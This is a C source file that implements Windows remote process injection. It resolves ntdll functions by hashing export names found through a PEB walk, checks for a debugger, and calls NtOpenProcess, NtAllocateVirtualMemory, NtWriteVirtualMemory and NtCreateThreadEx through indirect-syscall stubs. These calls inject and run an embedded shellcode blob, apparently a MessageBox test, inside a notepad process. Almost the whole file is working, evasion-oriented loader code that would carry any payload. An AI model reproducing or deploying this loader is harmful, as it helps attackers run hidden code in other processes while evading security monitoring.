#include "header.h"
// old memory ...
unsigned long long fibonacci(unsigned int n) {
    if (n <= 1) return n;
    return fibonacci(n - 1) + fibonacci(n - 2);
}

DWORD64 hashA(PCHAR chaine) {
    DWORD64 constante = 0xA28;
    int c = 0;

    while (c = *chaine++)
        constante = (constante << 5) + constante + c;

    return constante;
}

LPWSTR get_dll_name(PLDR_DATA_TABLE_ENTRY liste_flink) {

    PWCHAR ddl_name = liste_flink->FullDllName.Buffer;
    PWSTR dll = wcsrchr(ddl_name, '\\') + 1;
    return dll;
}

PVOID get_func(DWORD64 func_hashed) {

    // get the PEB, which contains information about our process
    PPEB ppeb = (PPEB)__readgsqword(0x60);

    // in the PEB struct, there is a list which contains our loaded module in the memory
    PLDR_DATA_TABLE_ENTRY liste_flink = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // get the DLL name
    LPWSTR dll_name = get_dll_name(liste_flink);

    // base address of the DLL load in memory
    PDWORD base_addr = (PDWORD)liste_flink->DllBase;

    // Entête DOS de l'image de la DLL
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS64 pe_header = (PIMAGE_NT_HEADERS64)((DWORD64)base_addr + dos_header->e_lfanew);

    // Adresse virtuelle du répertoire d'exportation
    ULONG offset_virtual_addresse = pe_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)offset_virtual_addresse + (DWORD64)base_addr);

    PDWORD adr_name = (PDWORD)((DWORD64)export_directory->AddressOfNames + (DWORD64)base_addr);
    PDWORD adr_func = (PDWORD)((DWORD64)export_directory->AddressOfFunctions + (DWORD64)base_addr);
    PWORD adr_ordinal = (PWORD)((DWORD64)export_directory->AddressOfNameOrdinals + (DWORD64)base_addr);

    // run on our number of function
    for (DWORD i = 0; i < export_directory->NumberOfFunctions; i++) {

        //PCHAR name = (PCHAR)(DWORD64)(adr_name + i * 8);

        DWORD_PTR adr_name_ = (DWORD64)adr_name[i] + (DWORD64)base_addr;
        //printf("Get :: %s\n", (char*)adr_name_);

        // compare the hash calculated of our function and the hash of the function of the dll
        if (func_hashed == hashA((char*)adr_name_)) {
            // be could use the name
            return (PVOID)((DWORD64)base_addr + adr_func[adr_ordinal[i]]);
        }
    }
    return 0;
}




int main() {

    PPEB ppeb = (PPEB)__readgsqword(0x60);

    printf("[+] PEB is : 0x % p\n", ppeb);

    if (ppeb->BeingDebugged != 0) {
        printf("[-] Debugger detected! lets do some math ...\n");
        // printf("res : %llu\n", fibonacci(43));
    }
    


    // here is our payload
    char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    SIZE_T size_allocated = 434;

    // process injection
    // step 1 -> get a handle with NtOpenProcess on a remote process
    // step 2 -> allocate memory on the remote process with NtAllocateVirtualMemory
    // step 3 -> write the shellcode in the remote process with NtWriteVirtualMemory (memcpy can only write in our own process)
    // step 4 -> execute the process with NtCreateThreadEx

    //// Step 1 ////
    // 1 -> ProcessHandle which will hold the handle to the the opened process. 
    // 2 -> DesiredAccess, what type of priv do we need
    // 3 -> ObjectAttributes contains a lot a of usefull stuff (kiding)
    // 4 -> ClientID, contain a PVOID on UniqueProcess and UniqueThread target

    // first our process
    HANDLE hProcess = NULL;
    DWORD pid = 11712; // PID of the process notepad

    // then the client_id with the handle of our PID
    CLIENT_ID client_id;
    client_id.UniqueProcess = (HANDLE)pid;
    client_id.UniqueThread = 0;

    OBJECT_ATTRIBUTES objattr;
    // macro that initialize the objectAttributes for us
    InitializeObjectAttributes(&objattr, NULL, 0, NULL, NULL);


    const char* func_name_NtOpenProcess = "NtOpenProcess";
    DWORD64 hash_NtOpenProcess = hashA((PCHAR)func_name_NtOpenProcess);
    PVOID func_my_NtOpenProcess = (PVOID)get_func(hash_NtOpenProcess);
    syscallAddress_NtOpenProcess = (DWORD64)(PVOID)func_my_NtOpenProcess + (0x18015F2C2 - 0x18015F2B0);

    NTSTATUS status_NtOpenProcess = my_asm_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objattr, &client_id);


    if (status_NtOpenProcess != 0) {
        printf("\n[+] open process failed. Error code: 0x%08X\n", status_NtOpenProcess);
        return 1;
    }
    else {
        printf("\n[+] process open successfuly! Handle : 0x%p\n", hProcess);
    }

    //// Step 2 ////
    LPVOID remoteMemory = NULL;

    const char* func_name_NtAllocateVirtualMemory = "NtAllocateVirtualMemory";
    DWORD64 hash_NtAllocateVirtualMemory = hashA((PCHAR)func_name_NtAllocateVirtualMemory);
    PVOID func_NtAllocateVirtualMemory = (PVOID)get_func(hash_NtAllocateVirtualMemory);
    syscallAddress_AllocateVirtualMemory = (DWORD64)(PVOID)func_NtAllocateVirtualMemory + (0x18015F102 - 0x18015F0F0);

    NTSTATUS status_NtAllocateVirtualMemory = my_asm_NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &size_allocated, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status_NtAllocateVirtualMemory != 0) {
        printf("[+] Allocation in the remote process failed. Error code: 0x%08X\n", status_NtAllocateVirtualMemory);
        return 1;
    }
    else {
        printf("[+] Allocation succed!\n");
        printf("[+] Allocated memory at: %p\n", remoteMemory);
    }

    //// Step 3 ////

    const char* func_name_NtWriteVirtualMemory = "NtWriteVirtualMemory";
    DWORD64 hash_NtWriteVirtualMemory = hashA((PCHAR)func_name_NtWriteVirtualMemory);
    PVOID func_NtWriteVirtualMemory = (PVOID)get_func(hash_NtWriteVirtualMemory);
    syscallAddress_NtWriteVirtualMemory = (DWORD64)(PVOID)func_NtWriteVirtualMemory + (0x18015F102 - 0x18015F0F0);

    NTSTATUS status_NtWriteVirtualMemory = my_asm_NtWriteVirtualMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL);

    if (status_NtWriteVirtualMemory != 0) {
        printf("[+] Write in remote process failed. Error code: 0x%08X\n", status_NtWriteVirtualMemory);
        return 1;
    }

    printf("[+] shelcode injected !\n");

    //// Step 4 ////

    PVOID feur = NULL;
    HANDLE hTread = NULL;

    const char* func_name_CTE = "NtCreateThreadEx";
    DWORD64 hash_CTE = hashA((PCHAR)func_name_CTE);
    PVOID func_my_CTE = (PVOID)get_func(hash_CTE);
    syscallAddress_CreateThreadEx = (DWORD64)(PVOID)func_my_CTE + (0x180160712 - 0x180160700);

    NTSTATUS status_NtCT = my_asm_NTCreateThreadex(&hTread, THREAD_ALL_ACCESS, NULL, hProcess, remoteMemory, NULL, FALSE, 0, 0, 0, NULL);
    if (status_NtCT != 0) {
        printf("[+] Execution in the remote thread failed. Error code: 0x%08X\n", status_NtCT);
        return 1;
    }

    printf("[+] sellcode executed !\n");


    const char* func_name_NtWaitForSingleObject = "NtWaitForSingleObject";
    DWORD64 hash_NtWaitForSingleObject = hashA((PCHAR)func_name_NtWaitForSingleObject);
    PVOID func_my_NtWaitForSingleObject = (PVOID)get_func(hash_NtWaitForSingleObject);
    syscallAddress_NtWaitForSingleObject = (DWORD64)(PVOID)func_my_NtWaitForSingleObject + (0x180160712 - 0x180160700);

    my_asm_NtWaitForSingleObject(hTread, INFINITE);

    //WaitForSingleObject(hTread, INFINITE);
}